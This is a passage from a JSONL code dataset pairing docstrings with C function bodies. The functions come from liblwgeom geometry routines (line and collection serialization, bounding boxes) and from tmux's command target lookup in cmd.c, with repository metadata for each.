\"lwline_serialize_buf copied serialized_pointlist (%d bytes)\",\n\t\tptsize * line->points->npoints);\n\n\tif (retsize) *retsize = loc-buf;\n\n\t/*printBYTES((uchar *)result, loc-buf); */\n\n\tLWDEBUGF(3, \"lwline_serialize_buf returning (loc: %p, size: %d)\",\n\t\tloc, loc-buf);\n}", "path": "src\\liblwgeom\\lwline.c", "repo_name": "geocommons/geocoder", "stars": 393, "license": "lgpl-3.0", "language": "c", "size": 6593}
{"docstring": "/*\n * Add 'what' to this multisurface at position 'where'\n * where=0 == prepend\n * where=-1 == append\n * Returns a MULTISURFACE or a COLLECTION\n */\n", "func_signal": "LWGEOM *\nlwmsurface_add(const LWMSURFACE *to, uint32 where, const LWGEOM *what)", "code": "{\n        LWCOLLECTION *col;\n        LWGEOM **geoms;\n        int newtype;\n        uint32 i;\n        \n        if(where == -1) where = to->ngeoms;\n        else if(where < -1 || where > to->ngeoms)\n        {\n                lwerror(\"lwmsurface_add: add position out of range %d..%d\",\n                        -1, to->ngeoms);\n                return NULL;\n        }\n\n        /* dimensions compatibility are checked by caller */\n\n        /* Construct geoms array */\n        geoms = lwalloc(sizeof(LWGEOM *)*(to->ngeoms+1));\n        for(i = 0; i < where; i++)\n        {\n                geoms[i] = lwgeom_clone((LWGEOM *)to->geoms[i]);\n        }\n        geoms[where] = lwgeom_clone(what);\n        for(i = where; i < to->ngeoms; i++)\n        {\n                geoms[i+1] = lwgeom_clone((LWGEOM *)to->geoms[i]);\n        }\n\n        if(TYPE_GETTYPE(what->type) == POLYGONTYPE \n                || TYPE_GETTYPE(what->type) == CURVEPOLYTYPE) \n            newtype = MULTISURFACETYPE;\n        else newtype = COLLECTIONTYPE;\n\n        col = lwcollection_construct(newtype,\n            to->SRID, NULL, to->ngeoms + 1, geoms);\n\n        return (LWGEOM *)col;\n}", "path": "src\\liblwgeom\\lwmsurface.c", "repo_name": "geocommons/geocoder", "stars": 393, "license": "lgpl-3.0", "language": "c", "size": 6593}
{"docstring": "/*\n * Construct a LWLINE from an array of LWPOINTs\n * LWLINE dimensions are large enough to host all input dimensions.\n */\n", "func_signal": "LWLINE *\nlwline_from_lwpointarray(int SRID, unsigned int npoints, LWPOINT **points)", "code": "{\n\tint zmflag=0;\n\tunsigned int i;\n\tPOINTARRAY *pa;\n\tuchar *newpoints, *ptr;\n\tsize_t ptsize, size;\n\n\t/*\n\t * Find output dimensions, check integrity\n\t */\n\tfor (i=0; i<npoints; i++)\n\t{\n\t\tif ( TYPE_GETTYPE(points[i]->type) != POINTTYPE )\n\t\t{\n\t\t\tlwerror(\"lwline_from_lwpointarray: invalid input type: %s\",\n\t\t\t\tlwgeom_typename(TYPE_GETTYPE(points[i]->type)));\n\t\t\treturn NULL;\n\t\t}\n\t\tif ( TYPE_HASZ(points[i]->type) ) zmflag |= 2;\n\t\tif ( TYPE_HASM(points[i]->type) ) zmflag |= 1;\n\t\tif ( zmflag == 3 ) break;\n\t}\n\n\tif ( zmflag == 0 ) ptsize=2*sizeof(double);\n\telse if ( zmflag == 3 ) ptsize=4*sizeof(double);\n\telse ptsize=3*sizeof(double);\n\n\t/*\n\t * Allocate output points array\n\t */\n\tsize = ptsize*npoints;\n\tnewpoints = lwalloc(size);\n\tmemset(newpoints, 0, size);\n\n\tptr=newpoints;\n\tfor (i=0; i<npoints; i++)\n\t{\n\t\tsize=pointArray_ptsize(points[i]->point);\n\t\tmemcpy(ptr, getPoint_internal(points[i]->point, 0), size);\n\t\tptr+=ptsize;\n\t}\n\n\tpa = pointArray_construct(newpoints, zmflag&2, zmflag&1, npoints);\n\n\treturn lwline_construct(SRID, NULL, pa);\n}", "path": "src\\liblwgeom\\lwline.c", "repo_name": "geocommons/geocoder", "stars": 393, "license": "lgpl-3.0", "language": "c", "size": 6593}
{"docstring": "/* find length of this serialized line */\n", "func_signal": "size_t\nlwgeom_size_line(const uchar *serialized_line)", "code": "{\n\tint type = (uchar) serialized_line[0];\n\tuint32 result = 1;  /*type */\n\tconst uchar *loc;\n\tuint32 npoints;\n\n\tLWDEBUG(2, \"lwgeom_size_line called\");\n\n\tif ( lwgeom_getType(type) != LINETYPE)\n\t\tlwerror(\"lwgeom_size_line::attempt to find the length of a non-line\");\n\n\n\tloc = serialized_line+1;\n\n\tif (lwgeom_hasBBOX(type))\n\t{\n\t\tloc += sizeof(BOX2DFLOAT4);\n\t\tresult +=sizeof(BOX2DFLOAT4);\n\t}\n\n\tif ( lwgeom_hasSRID(type))\n\t{\n\t\tloc += 4; /* type + SRID */\n\t\tresult +=4;\n\t}\n\n\t/* we've read the type (1 byte) and SRID (4 bytes, if present) */\n\tnpoints = lw_get_uint32(loc);\n\tresult += sizeof(uint32); /* npoints */\n\n\tresult += TYPE_NDIMS(type) * sizeof(double) * npoints;\n\n\tLWDEBUGF(3, \"lwgeom_size_line returning %d\", result);\n\n\treturn result;\n}", "path": "src\\liblwgeom\\lwline.c", "repo_name": "geocommons/geocoder", "stars": 393, "license": "lgpl-3.0", "language": "c", "size": 6593}
{"docstring": "/*\n * Find bounding box (standard one) \n * zmin=zmax=NO_Z_VALUE if 2d \n */\n", "func_signal": "BOX3D *\nlwline_compute_box3d(LWLINE *line)", "code": "{\n\tBOX3D *ret;\n\n\tif (line == NULL) return NULL;\n\n\tret = ptarray_compute_box3d(line->points);\n\treturn ret;\n}", "path": "src\\liblwgeom\\lwline.c", "repo_name": "geocommons/geocoder", "stars": 393, "license": "lgpl-3.0", "language": "c", "size": 6593}
{"docstring": "/* find serialized size of this collection */\n", "func_signal": "size_t\nlwcollection_serialize_size(LWCOLLECTION *col)", "code": "{\n\tsize_t size = 5; /* type + nsubgeoms */\n\tint i;\n\n\tif ( col->SRID != -1 ) size += 4; /* SRID */\n\tif ( col->bbox ) size += sizeof(BOX2DFLOAT4);\n\n\tLWDEBUGF(2, \"lwcollection_serialize_size[%p]: start size: %d\", col, size);\n\n\n\tfor (i=0; i<col->ngeoms; i++)\n\t{\n\t\tsize += lwgeom_serialize_size(col->geoms[i]);\n\n\t\tLWDEBUGF(3, \"lwcollection_serialize_size[%p]: with geom%d: %d\", col, i, size);\n\t}\n\n\tLWDEBUGF(3, \"lwcollection_serialize_size[%p]:  returning %d\", col, size);\n\n\treturn size; \n}", "path": "src\\liblwgeom\\lwcollection.c", "repo_name": "geocommons/geocoder", "stars": 393, "license": "lgpl-3.0", "language": "c", "size": 6593}
{"docstring": "/*\n * Add 'what' to this collection at position 'where'.\n * where=0 == prepend\n * where=-1 == append\n * Returns a GEOMETRYCOLLECTION\n */\n", "func_signal": "LWGEOM *\nlwcollection_add(const LWCOLLECTION *to, uint32 where, const LWGEOM *what)", "code": "{\n\tLWCOLLECTION *col;\n\tLWGEOM **geoms;\n\tuint32 i;\n\n\tif ( where == -1 ) where = to->ngeoms;\n\telse if ( where < -1 || where > to->ngeoms )\n\t{\n\t\tlwerror(\"lwcollection_add: add position out of range %d..%d\",\n\t\t\t-1, to->ngeoms);\n\t\treturn NULL;\n\t}\n\n\t/* dimensions compatibility are checked by caller */\n\n\t/* Construct geoms array */\n\tgeoms = lwalloc(sizeof(LWGEOM *)*(to->ngeoms+1));\n\tfor (i=0; i<where; i++)\n\t{\n\t\tgeoms[i] = lwgeom_clone(to->geoms[i]);\n\t\tlwgeom_dropSRID(geoms[i]);\n\t\tlwgeom_drop_bbox(geoms[i]);\n\t}\n\tgeoms[where] = lwgeom_clone(what);\n\tlwgeom_dropSRID(geoms[where]);\n\tlwgeom_drop_bbox(geoms[where]);\n\tfor (i=where; i<to->ngeoms; i++)\n\t{\n\t\tgeoms[i+1] = lwgeom_clone(to->geoms[i]);\n\t\tlwgeom_dropSRID(geoms[i+1]);\n\t\tlwgeom_drop_bbox(geoms[i+1]);\n\t}\n\n\tcol = lwcollection_construct(COLLECTIONTYPE,\n\t\tto->SRID, NULL,\n\t\tto->ngeoms+1, geoms);\n\t\n\treturn (LWGEOM *)col;\n\n}", "path": "src\\liblwgeom\\lwcollection.c", "repo_name": "geocommons/geocoder", "stars": 393, "license": "lgpl-3.0", "language": "c", "size": 6593}
{"docstring": "/* check for same geometry composition */\n", "func_signal": "char\nlwcollection_same(const LWCOLLECTION *c1, const LWCOLLECTION *c2)", "code": "{\n\tunsigned int i, j;\n\tunsigned int *hit;\n\n\tLWDEBUG(2, \"lwcollection_same called\");\n\n\tif ( TYPE_GETTYPE(c1->type) != TYPE_GETTYPE(c2->type) ) return 0;\n\tif ( c1->ngeoms != c2->ngeoms ) return 0;\n\n\thit = lwalloc(sizeof(unsigned int)*c1->ngeoms);\n\tmemset(hit, 0, sizeof(unsigned int)*c1->ngeoms);\n\n\tfor (i=0; i<c1->ngeoms; i++)\n\t{\n\t\tchar found=0;\n\t\tfor (j=0; j<c2->ngeoms; j++)\n\t\t{\n\t\t\tif ( hit[j] ) continue;\n\t\t\tif ( lwgeom_same(c1->geoms[i], c2->geoms[j]) )\n\t\t\t{\n\t\t\t\thit[j] = 1;\n\t\t\t\tfound=1;\n\t\t\t\tbreak;\n\t\t\t}\n\t\t}\n\t\tif ( ! found ) return 0;\n\t}\n\treturn 1;\n}", "path": "src\\liblwgeom\\lwcollection.c", "repo_name": "geocommons/geocoder", "stars": 393, "license": "lgpl-3.0", "language": "c", "size": 6593}
{"docstring": "/*\n * Construct a LWLINE from a LWMPOINT\n */\n", "func_signal": "LWLINE *\nlwline_from_lwmpoint(int SRID, LWMPOINT *mpoint)", "code": "{\n\tunsigned int i;\n\tPOINTARRAY *pa;\n\tchar zmflag = TYPE_GETZM(mpoint->type);\n\tsize_t ptsize, size;\n\tuchar *newpoints, *ptr;\n\n\tif ( zmflag == 0 ) ptsize=2*sizeof(double);\n\telse if ( zmflag == 3 ) ptsize=4*sizeof(double);\n\telse ptsize=3*sizeof(double);\n\n\t/* Allocate space for output points */\n\tsize = ptsize*mpoint->ngeoms;\n\tnewpoints = lwalloc(size);\n\tmemset(newpoints, 0, size);\n\n\tptr=newpoints;\n\tfor (i=0; i<mpoint->ngeoms; i++)\n\t{\n\t\tmemcpy(ptr,\n\t\t\tgetPoint_internal(mpoint->geoms[i]->point, 0),\n\t\t\tptsize);\n\t\tptr+=ptsize;\n\t}\n\n\tpa = pointArray_construct(newpoints, zmflag&2, zmflag&1,\n\t\tmpoint->ngeoms);\n\n\tLWDEBUGF(3, \"lwline_from_lwmpoint: constructed pointarray for %d points, %d zmflag\", mpoint->ngeoms, zmflag);\n\n\treturn lwline_construct(SRID, NULL, pa);\n}", "path": "src\\liblwgeom\\lwline.c", "repo_name": "geocommons/geocoder", "stars": 393, "license": "lgpl-3.0", "language": "c", "size": 6593}
{"docstring": "/*\n * This has been changed in PostGIS 1.1.2 to\n * check exact equality of values (rather then using\n * the FPeq macro taking into account coordinate drifts).\n */\n", "func_signal": "char\nbox2d_same(BOX2DFLOAT4 *box1, BOX2DFLOAT4 *box2)", "code": "{\n\treturn(\t(box1->xmax==box2->xmax) &&\n\t\t(box1->xmin==box2->xmin) &&\n\t\t(box1->ymax==box2->ymax) &&\n\t\t(box1->ymin==box2->ymin));\n#if 0 \n\treturn(FPeq(box1->xmax, box2->xmax) &&\n\t\t\t\t   FPeq(box1->xmin, box2->xmin) &&\n\t\t\t\t   FPeq(box1->ymax, box2->ymax) &&\n\t\t\t\t   FPeq(box1->ymin, box2->ymin));\n#endif\n}", "path": "src\\liblwgeom\\box2d.c", "repo_name": "geocommons/geocoder", "stars": 393, "license": "lgpl-3.0", "language": "c", "size": 6593}
{"docstring": "/* Lookup window id. An initial @ means a window id. */\n", "func_signal": "struct window *\ncmd_lookup_windowid(const char *arg)", "code": "{\n\tconst char\t*errstr;\n\tu_int\t\t windowid;\n\n\tif (*arg != '@')\n\t\treturn (NULL);\n\n\twindowid = strtonum(arg + 1, 0, UINT_MAX, &errstr);\n\tif (errstr != NULL)\n\t\treturn (NULL);\n\treturn (window_find_by_id(windowid));\n}", "path": "example\\from_dir\\tmux\\cmd.c", "repo_name": "docker-rpm-builder/docker-rpm-builder", "stars": 379, "license": "other", "language": "c", "size": 13925}
{"docstring": "/* Find the target client or report an error and return NULL. */\n", "func_signal": "struct client *\ncmd_find_client(struct cmd_q *cmdq, const char *arg, int quiet)", "code": "{\n\tstruct client\t*c;\n\tchar\t\t*tmparg;\n\tsize_t\t\t arglen;\n\n\t/* A NULL argument means the current client. */\n\tif (arg == NULL) {\n\t\tc = cmd_current_client(cmdq);\n\t\tif (c == NULL && !quiet)\n\t\t\tcmdq_error(cmdq, \"no clients\");\n\t\treturn (c);\n\t}\n\ttmparg = xstrdup(arg);\n\n\t/* Trim a single trailing colon if any. */\n\targlen = strlen(tmparg);\n\tif (arglen != 0 && tmparg[arglen - 1] == ':')\n\t\ttmparg[arglen - 1] = '\\0';\n\n\t/* Find the client, if any. */\n\tc = cmd_lookup_client(tmparg);\n\n\t/* If no client found, report an error. */\n\tif (c == NULL && !quiet)\n\t\tcmdq_error(cmdq, \"client not found: %s\", tmparg);\n\n\tfree(tmparg);\n\treturn (c);\n}", "path": "example\\from_dir\\tmux\\cmd.c", "repo_name": "docker-rpm-builder/docker-rpm-builder", "stars": 379, "license": "other", "language": "c", "size": 13925}
{"docstring": "/*\n * Return the default path for a new pane, using the given path or the\n * default-path option if it is NULL. Several special values are accepted: the\n * empty string or relative path for the current pane's working directory, ~\n * for the user's home, - for the session working directory, . for the tmux\n * server's working directory. The default on failure is the session's working\n * directory.\n */\n", "func_signal": "const char *\ncmd_get_default_path(struct cmd_q *cmdq, const char *cwd)", "code": "{\n\tstruct client\t\t*c = cmdq->client;\n\tstruct session\t\t*s;\n\tstruct environ_entry\t*envent;\n\tconst char\t\t*root;\n\tchar\t\t\t tmp[MAXPATHLEN];\n\tstruct passwd\t\t*pw;\n\tint\t\t\t n;\n\tsize_t\t\t\t skip;\n\tstatic char\t\t path[MAXPATHLEN];\n\n\tif ((s = cmd_current_session(cmdq, 0)) == NULL)\n\t\treturn (NULL);\n\n\tif (cwd == NULL)\n\t\tcwd = options_get_string(&s->options, \"default-path\");\n\n\tskip = 1;\n\tif (strcmp(cwd, \"$HOME\") == 0 || strncmp(cwd, \"$HOME/\", 6) == 0) {\n\t\t/* User's home directory - $HOME. */\n\t\tskip = 5;\n\t\tgoto find_home;\n\t} else if (cwd[0] == '~' && (cwd[1] == '\\0' || cwd[1] == '/')) {\n\t\t/* User's home directory - ~. */\n\t\tgoto find_home;\n\t} else if (cwd[0] == '-' && (cwd[1] == '\\0' || cwd[1] == '/')) {\n\t\t/* Session working directory. */\n\t\troot = s->cwd;\n\t\tgoto complete_path;\n\t} else if (cwd[0] == '.' && (cwd[1] == '\\0' || cwd[1] == '/')) {\n\t\t/* Server working directory. */\n\t\tif (getcwd(tmp, sizeof tmp) != NULL) {\n\t\t\troot = tmp;\n\t\t\tgoto complete_path;\n\t\t}\n\t\treturn (s->cwd);\n\t} else if (*cwd == '/') {\n\t\t/* Absolute path. */\n\t\treturn (cwd);\n\t} else {\n\t\t/* Empty or relative path. */\n\t\tif (c != NULL && c->session == NULL && c->cwd != NULL)\n\t\t\troot = c->cwd;\n\t\telse if (s->curw != NULL)\n\t\t\troot = osdep_get_cwd(s->curw->window->active->fd);\n\t\telse\n\t\t\treturn (s->cwd);\n\t\tskip = 0;\n\t\tif (root != NULL)\n\t\t\tgoto complete_path;\n\t}\n\n\treturn (s->cwd);\n\nfind_home:\n\tenvent = environ_find(&global_environ, \"HOME\");\n\tif (envent != NULL && *envent->value != '\\0')\n\t\troot = envent->value;\n\telse if ((pw = getpwuid(getuid())) != NULL)\n\t\troot = pw->pw_dir;\n\telse\n\t\treturn (s->cwd);\n\ncomplete_path:\n\tif (root[skip] == '\\0') {\n\t\tstrlcpy(path, root, sizeof path);\n\t\treturn (path);\n\t}\n\tn = snprintf(path, sizeof path, \"%s/%s\", root, cwd + skip);\n\tif (n > 0 && (size_t)n < sizeof path)\n\t\treturn (path);\n\treturn (s->cwd);\n}", "path": "example\\from_dir\\tmux\\cmd.c", "repo_name": "docker-rpm-builder/docker-rpm-builder", "stars": 379, "license": "other", "language": "c", "size": 13925}
{"docstring": "/*\n * Figure out the current session. Use: 1) the current session, if the command\n * context has one; 2) the most recently used session containing the pty of the\n * calling client, if any; 3) the session specified in the TMUX variable from\n * the environment (as passed from the client); 4) the most recently used\n * session from all sessions.\n */\n", "func_signal": "struct session *\ncmd_current_session(struct cmd_q *cmdq, int prefer_unattached)", "code": "{\n\tstruct msg_command_data\t*data = cmdq->msgdata;\n\tstruct client\t\t*c = cmdq->client;\n\tstruct session\t\t*s;\n\tstruct sessionslist\t ss;\n\tstruct winlink\t\t*wl;\n\tstruct window_pane\t*wp;\n\tconst char\t\t*path;\n\tint\t\t\t found;\n\n\tif (c != NULL && c->session != NULL)\n\t\treturn (c->session);\n\n\t/*\n\t * If the name of the calling client's pty is known, build a list of\n\t * the sessions that contain it and if any choose either the first or\n\t * the newest.\n\t */\n\tpath = c == NULL ? NULL : c->tty.path;\n\tif (path != NULL) {\n\t\tARRAY_INIT(&ss);\n\t\tRB_FOREACH(s, sessions, &sessions) {\n\t\t\tfound = 0;\n\t\t\tRB_FOREACH(wl, winlinks, &s->windows) {\n\t\t\t\tTAILQ_FOREACH(wp, &wl->window->panes, entry) {\n\t\t\t\t\tif (strcmp(wp->tty, path) == 0) {\n\t\t\t\t\t\tfound = 1;\n\t\t\t\t\t\tbreak;\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\tif (found)\n\t\t\t\t\tbreak;\n\t\t\t}\n\t\t\tif (found)\n\t\t\t\tARRAY_ADD(&ss, s);\n\t\t}\n\n\t\ts = cmd_choose_session_list(&ss);\n\t\tARRAY_FREE(&ss);\n\t\tif (s != NULL)\n\t\t\treturn (s);\n\t}\n\n\t/* Use the session from the TMUX environment variable. */\n\tif (data != NULL && data->pid == getpid() && data->session_id != -1) {\n\t\ts = session_find_by_id(data->session_id);\n\t\tif (s != NULL)\n\t\t\treturn (s);\n\t}\n\n\treturn (cmd_choose_session(prefer_unattached));\n}", "path": "example\\from_dir\\tmux\\cmd.c", "repo_name": "docker-rpm-builder/docker-rpm-builder", "stars": 379, "license": "other", "language": "c", "size": 13925}
{"docstring": "/*\n * Find the target session, window and pane number or report an error and\n * return NULL. The pane number is separated from the session:window by a .,\n * such as mysession:mywindow.0.\n */\n", "func_signal": "struct winlink *\ncmd_find_pane(struct cmd_q *cmdq,\n    const char *arg, struct session **sp, struct window_pane **wpp)", "code": "{\n\tstruct session\t*s;\n\tstruct winlink\t*wl;\n\tconst char\t*period, *errstr;\n\tchar\t\t*winptr, *paneptr;\n\tu_int\t\t idx;\n\n\t/* Get the current session. */\n\tif ((s = cmd_current_session(cmdq, 0)) == NULL) {\n\t\tcmdq_error(cmdq, \"can't establish current session\");\n\t\treturn (NULL);\n\t}\n\tif (sp != NULL)\n\t\t*sp = s;\n\n\t/* A NULL argument means the current session, window and pane. */\n\tif (arg == NULL) {\n\t\t*wpp = s->curw->window->active;\n\t\treturn (s->curw);\n\t}\n\n\t/* Lookup as pane id. */\n\tif ((*wpp = cmd_lookup_paneid(arg)) != NULL) {\n\t\ts = cmd_window_session(cmdq, (*wpp)->window, &wl);\n\t\tif (sp != NULL)\n\t\t\t*sp = s;\n\t\treturn (wl);\n\t}\n\n\t/* Look for a separating period. */\n\tif ((period = strrchr(arg, '.')) == NULL)\n\t\tgoto no_period;\n\n\t/* Pull out the window part and parse it. */\n\twinptr = xstrdup(arg);\n\twinptr[period - arg] = '\\0';\n\tif (*winptr == '\\0')\n\t\twl = s->curw;\n\telse if ((wl = cmd_find_window(cmdq, winptr, sp)) == NULL)\n\t\tgoto error;\n\n\t/* Find the pane section and look it up. */\n\tpaneptr = winptr + (period - arg) + 1;\n\tif (*paneptr == '\\0')\n\t\t*wpp = wl->window->active;\n\telse if (paneptr[0] == '+' || paneptr[0] == '-')\n\t\t*wpp = cmd_find_pane_offset(paneptr, wl);\n\telse {\n\t\tidx = strtonum(paneptr, 0, INT_MAX, &errstr);\n\t\tif (errstr != NULL)\n\t\t\tgoto lookup_string;\n\t\t*wpp = window_pane_at_index(wl->window, idx);\n\t\tif (*wpp == NULL)\n\t\t\tgoto lookup_string;\n\t}\n\n\tfree(winptr);\n\treturn (wl);\n\nlookup_string:\n\t/* Try pane string description. */\n\tif ((*wpp = window_find_string(wl->window, paneptr)) == NULL) {\n\t\tcmdq_error(cmdq, \"can't find pane: %s\", paneptr);\n\t\tgoto error;\n\t}\n\n\tfree(winptr);\n\treturn (wl);\n\nno_period:\n\t/* Try as a pane number alone. */\n\tidx = strtonum(arg, 0, INT_MAX, &errstr);\n\tif (errstr != NULL)\n\t\tgoto lookup_window;\n\n\t/* Try index in the current session and window. */\n\tif ((*wpp = window_pane_at_index(s->curw->window, idx)) == NULL)\n\t\tgoto lookup_window;\n\n\treturn (s->curw);\n\nlookup_window:\n\t/* Try pane string description. */\n\tif ((*wpp = window_find_string(s->curw->window, arg)) != NULL)\n\t\treturn (s->curw);\n\n\t/* Try as a window and use the active pane. */\n\tif ((wl = cmd_find_window(cmdq, arg, sp)) != NULL)\n\t\t*wpp = wl->window->active;\n\treturn (wl);\n\nerror:\n\tfree(winptr);\n\treturn (NULL);\n}", "path": "example\\from_dir\\tmux\\cmd.c", "repo_name": "docker-rpm-builder/docker-rpm-builder", "stars": 379, "license": "other", "language": "c", "size": 13925}
{"docstring": "/* Find the target session or report an error and return NULL. */\n", "func_signal": "struct session *\ncmd_find_session(struct cmd_q *cmdq, const char *arg, int prefer_unattached)", "code": "{\n\tstruct session\t\t*s;\n\tstruct window_pane\t*wp;\n\tstruct window\t\t*w;\n\tstruct client\t\t*c;\n\tchar\t\t\t*tmparg;\n\tsize_t\t\t\t arglen;\n\tint\t\t\t ambiguous;\n\n\t/* A NULL argument means the current session. */\n\tif (arg == NULL)\n\t\treturn (cmd_current_session(cmdq, prefer_unattached));\n\n\t/* Lookup as pane id or window id. */\n\tif ((wp = cmd_lookup_paneid(arg)) != NULL)\n\t\treturn (cmd_window_session(cmdq, wp->window, NULL));\n\tif ((w = cmd_lookup_windowid(arg)) != NULL)\n\t\treturn (cmd_window_session(cmdq, w, NULL));\n\n\t/* Trim a single trailing colon if any. */\n\ttmparg = xstrdup(arg);\n\targlen = strlen(tmparg);\n\tif (arglen != 0 && tmparg[arglen - 1] == ':')\n\t\ttmparg[arglen - 1] = '\\0';\n\n\t/* An empty session name is the current session. */\n\tif (*tmparg == '\\0') {\n\t\tfree(tmparg);\n\t\treturn (cmd_current_session(cmdq, prefer_unattached));\n\t}\n\n\t/* Find the session, if any. */\n\ts = cmd_lookup_session(tmparg, &ambiguous);\n\n\t/* If it doesn't, try to match it as a client. */\n\tif (s == NULL && (c = cmd_lookup_client(tmparg)) != NULL)\n\t\ts = c->session;\n\n\t/* If no session found, report an error. */\n\tif (s == NULL) {\n\t\tif (ambiguous)\n\t\t\tcmdq_error(cmdq, \"more than one session: %s\", tmparg);\n\t\telse\n\t\t\tcmdq_error(cmdq, \"session not found: %s\", tmparg);\n\t}\n\n\tfree(tmparg);\n\treturn (s);\n}", "path": "example\\from_dir\\tmux\\cmd.c", "repo_name": "docker-rpm-builder/docker-rpm-builder", "stars": 379, "license": "other", "language": "c", "size": 13925}
{"docstring": "/* Lookup window id in a session. An initial @ means a window id. */\n", "func_signal": "struct winlink *\ncmd_lookup_winlink_windowid(struct session *s, const char *arg)", "code": "{\n\tconst char\t*errstr;\n\tu_int\t\t windowid;\n\n\tif (*arg != '@')\n\t\treturn (NULL);\n\n\twindowid = strtonum(arg + 1, 0, UINT_MAX, &errstr);\n\tif (errstr != NULL)\n\t\treturn (NULL);\n\treturn (winlink_find_by_window_id(&s->windows, windowid));\n}", "path": "example\\from_dir\\tmux\\cmd.c", "repo_name": "docker-rpm-builder/docker-rpm-builder", "stars": 379, "license": "other", "language": "c", "size": 13925}
{"docstring": "/* Find the target session or report an error and return NULL. */\n", "func_signal": "struct session *\ncmd_lookup_session_id(const char *arg)", "code": "{\n\tchar\t*endptr;\n\tlong\t id;\n\n\tif (arg[0] != '$')\n\t\treturn (NULL);\n\tid = strtol(arg + 1, &endptr, 10);\n\tif (arg[1] != '\\0' && *endptr == '\\0')\n\t\treturn (session_find_by_id(id));\n\treturn (NULL);\n}", "path": "example\\from_dir\\tmux\\cmd.c", "repo_name": "docker-rpm-builder/docker-rpm-builder", "stars": 379, "license": "other", "language": "c", "size": 13925}
{"docstring": "/* Choose the most recently used client from a list. */\n", "func_signal": "struct client *\ncmd_choose_client(struct clients *cc)", "code": "{\n\tstruct client\t*c, *cbest;\n\tstruct timeval\t*tv = NULL;\n\tu_int\t\t i;\n\n\tcbest = NULL;\n\tfor (i = 0; i < ARRAY_LENGTH(cc); i++) {\n\t\tif ((c = ARRAY_ITEM(cc, i)) == NULL)\n\t\t\tcontinue;\n\t\tif (c->session == NULL)\n\t\t\tcontinue;\n\n\t\tif (tv == NULL || timercmp(&c->activity_time, tv, >)) {\n\t\t\tcbest = c;\n\t\t\ttv = &c->activity_time;\n\t\t}\n\t}\n\n\treturn (cbest);\n}", "path": "example\\from_dir\\tmux\\cmd.c", "repo_name": "docker-rpm-builder/docker-rpm-builder", "stars": 379, "license": "other", "language": "c", "size": 13925}
{"docstring": "/* Find session and winlink for window. */\n", "func_signal": "struct session *\ncmd_window_session(struct cmd_q *cmdq, struct window *w, struct winlink **wlp)", "code": "{\n\tstruct session\t\t*s;\n\tstruct sessionslist\t ss;\n\tstruct winlink\t\t*wl;\n\n\t/* If this window is in the current session, return that winlink. */\n\ts = cmd_current_session(cmdq, 0);\n\tif (s != NULL) {\n\t\twl = winlink_find_by_window(&s->windows, w);\n\t\tif (wl != NULL) {\n\t\t\tif (wlp != NULL)\n\t\t\t\t*wlp = wl;\n\t\t\treturn (s);\n\t\t}\n\t}\n\n\t/* Otherwise choose from all sessions with this window. */\n\tARRAY_INIT(&ss);\n\tRB_FOREACH(s, sessions, &sessions) {\n\t\tif (winlink_find_by_window(&s->windows, w) != NULL)\n\t\t\tARRAY_ADD(&ss, s);\n\t}\n\ts = cmd_choose_session_list(&ss);\n\tARRAY_FREE(&ss);\n\tif (wlp != NULL)\n\t\t*wlp = winlink_find_by_window(&s->windows, w);\n\treturn (s);\n}", "path": "example\\from_dir\\tmux\\cmd.c", "repo_name": "docker-rpm-builder/docker-rpm-builder", "stars": 379, "license": "other", "language": "c", "size": 13925}
{"docstring": "/*\n * Find a window index - if the window doesn't exist, check if it is a\n * potential index and return it anyway.\n */\n", "func_signal": "int\ncmd_lookup_index(struct session *s, const char *name, int *ambiguous)", "code": "{\n\tstruct winlink\t*wl;\n\tconst char\t*errstr;\n\tu_int\t\t idx;\n\n\tif ((wl = cmd_lookup_window(s, name, ambiguous)) != NULL)\n\t\treturn (wl->idx);\n\tif (*ambiguous)\n\t\treturn (-1);\n\n\tidx = strtonum(name, 0, INT_MAX, &errstr);\n\tif (errstr == NULL)\n\t\treturn (idx);\n\n\treturn (-1);\n}", "path": "example\\from_dir\\tmux\\cmd.c", "repo_name": "docker-rpm-builder/docker-rpm-builder", "stars": 379, "license": "other", "language": "c", "size": 13925}
{"docstring": "/*\n * Find the target session and window index, whether or not it exists in the\n * session. Return -2 on error or -1 if no window index is specified. This is\n * used when parsing an argument for a window target that may not exist (for\n * example if it is going to be created).\n */\n", "func_signal": "int\ncmd_find_index(struct cmd_q *cmdq, const char *arg, struct session **sp)", "code": "{\n\tstruct session\t*s;\n\tstruct winlink\t*wl;\n\tconst char\t*winptr;\n\tchar\t\t*sessptr = NULL;\n\tint\t\t idx, ambiguous = 0;\n\n\t/*\n\t * Find the current session. There must always be a current session, if\n\t * it can't be found, report an error.\n\t */\n\tif ((s = cmd_current_session(cmdq, 0)) == NULL) {\n\t\tcmdq_error(cmdq, \"can't establish current session\");\n\t\treturn (-2);\n\t}\n\n\t/* A NULL argument means the current session and \"no window\" (-1). */\n\tif (arg == NULL) {\n\t\tif (sp != NULL)\n\t\t\t*sp = s;\n\t\treturn (-1);\n\t}\n\n\t/* Time to look at the argument. If it is empty, that is an error. */\n\tif (*arg == '\\0')\n\t\tgoto not_found;\n\n\t/* Find the separating colon. If none, assume the current session. */\n\twinptr = strchr(arg, ':');\n\tif (winptr == NULL)\n\t\tgoto no_colon;\n\twinptr++;\t/* skip : */\n\tsessptr = xstrdup(arg);\n\t*strchr(sessptr, ':') = '\\0';\n\n\t/* Try to lookup the session if present. */\n\tif (sessptr != NULL && *sessptr != '\\0') {\n\t\tif ((s = cmd_lookup_session(sessptr, &ambiguous)) == NULL)\n\t\t\tgoto no_session;\n\t}\n\tif (sp != NULL)\n\t\t*sp = s;\n\n\t/*\n\t * Then work out the window. An empty string is a new window otherwise\n\t * try to look it up in the session.\n\t */\n\tif (*winptr == '\\0')\n\t\tidx = -1;\n\telse if (winptr[0] == '!' && winptr[1] == '\\0') {\n\t\tif ((wl = TAILQ_FIRST(&s->lastw)) == NULL)\n\t\t\tgoto not_found;\n\t\tidx = wl->idx;\n\t} else if (winptr[0] == '+' || winptr[0] == '-') {\n\t\tif ((idx = cmd_find_index_offset(winptr, s, &ambiguous)) < 0)\n\t\t\tgoto invalid_index;\n\t} else if ((idx = cmd_lookup_index(s, winptr, &ambiguous)) == -1)\n\t\tgoto invalid_index;\n\n\tfree(sessptr);\n\treturn (idx);\n\nno_colon:\n\t/*\n\t * No colon in the string, first try special cases, then as a window\n\t * and lastly as a session.\n\t */\n\tif (arg[0] == '!' && arg[1] == '\\0') {\n\t\tif ((wl = TAILQ_FIRST(&s->lastw)) == NULL)\n\t\t\tgoto not_found;\n\t\tidx = wl->idx;\n\t} else if (arg[0] == '+' || arg[0] == '-') 